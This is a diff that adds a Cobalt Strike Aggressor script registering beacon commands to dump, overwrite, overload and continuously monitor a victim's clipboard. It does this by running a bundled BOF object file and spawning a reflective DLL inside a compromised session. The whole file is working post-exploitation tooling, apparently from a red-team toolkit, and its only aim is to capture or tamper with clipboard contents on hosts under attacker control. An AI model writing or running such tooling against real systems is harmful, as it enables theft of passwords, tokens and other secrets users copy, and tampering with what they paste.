@@ -1,0 +1,89 @@
+beacon_command_register(
+	"set-clipboard-data",
+	"Set data in clipboard",
+	"Usage : set-clipboard-data https://www.youtube.com/watch?v=dQw4w9WgXcQ" 
+);
+alias set-clipboard-data {
+
+	if(size(@_) != 2)
+	{
+		berror($1, "Bad Usage !");
+		berror($1, beacon_command_detail("set-clipboard-data"));
+		return;
+	}
+    
+    local('$handle $data $args');
+    	
+    # read in the right BOF file
+	$handle = openf(script_resource("cobaltclip.o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	#pack our arguments
+	$args   = bof_pack($1, "z", $2);
+    	
+    # figure out the arch of this session
+	btask($1, "Launch set-clipboard-data");
+	beacon_inline_execute($1, $data, "setclipdata", $args);
+	
+	
+}
+
+beacon_command_register(
+	"dumpclip",
+	"Dump the content of clipboard",
+	"Usage : dumpclip" 
+);
+
+alias dumpclip
+{
+	# figure out the arch of this session
+	$barch  = barch($1);
+
+	# read in the right BOF file
+	$handle = openf(script_resource("cobaltclip.o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+
+	# announce what we're doing
+	btask($1, "Running dumpclip");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "dumpclip");
+}
+
+beacon_command_register(
+	"overload-clip",
+	"Overload the content of clipboard to force a output for monitoring",
+	"Usage : overload-clip" 
+);
+
+alias overload-clip
+{
+	# figure out the arch of this session
+	$barch  = barch($1);
+
+	# read in the right BOF file
+	$handle = openf(script_resource("cobaltclip.o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+
+	# announce what we're doing
+	btask($1, "Overload the clipboard");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "overload_clipboard");
+}
+
+beacon_command_register(
+	"clipmon",
+	"Launch reflective dll has post-ex jobs to monitor the clipboard",
+	"Usage : clipmon" 
+);
+
+alias clipmon {
+        bdllspawn($1, script_resource("clipmon.x64.dll"), $2, "Clipboard monitor", 5000, false);
+}
+
